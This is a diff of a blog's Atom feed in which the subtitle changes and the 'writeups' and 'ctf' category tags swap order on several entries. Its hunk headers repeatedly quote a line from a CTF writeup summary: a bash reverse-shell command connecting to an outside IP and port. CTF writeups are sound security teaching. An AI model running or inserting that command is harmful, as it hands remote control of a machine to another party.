@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title>Virink&#39;s Blog</title>
-  <subtitle>探索技術，追求超越。</subtitle>
+  <subtitle>Let life be beautiful like summer flowers, and death like autume leaves.</subtitle>
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
@@ -100,9 +100,9 @@ If you see &lt;a href=&quot;http://app.py
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -194,9 +194,9 @@ if (isset($_COOKIE[&amp;quot
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -688,9 +688,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -711,9 +711,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -733,9 +733,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -756,9 +756,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -780,9 +780,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -803,9 +803,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -845,9 +845,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -869,9 +869,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
